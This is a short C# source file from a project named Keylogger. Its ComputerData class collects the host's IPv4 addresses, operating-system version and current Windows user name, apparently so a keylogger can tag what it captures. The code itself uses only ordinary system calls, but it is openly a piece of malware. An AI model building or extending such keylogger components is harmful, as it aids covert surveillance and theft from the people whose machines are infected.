using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger.Keylogger
{
    public class ComputerData
    {
        public static string IPv4s
        {
            get
            {
                List<string> ips = new List<string>();

                foreach (var ip in Array.FindAll(Dns.GetHostEntry(string.Empty).AddressList, x => x.AddressFamily == AddressFamily.InterNetwork))
                {
                    ips.Add(ip.ToString());
                }

                return string.Join(", ", ips);
            }
        }
        public static string OperatingSystem
        {
            get
            {
                return Environment.OSVersion.VersionString;
            }
        }
        public static string ComputerName
        {
            get
            {
                return WindowsIdentity.GetCurrent().Name;
            }
        }
    }
}
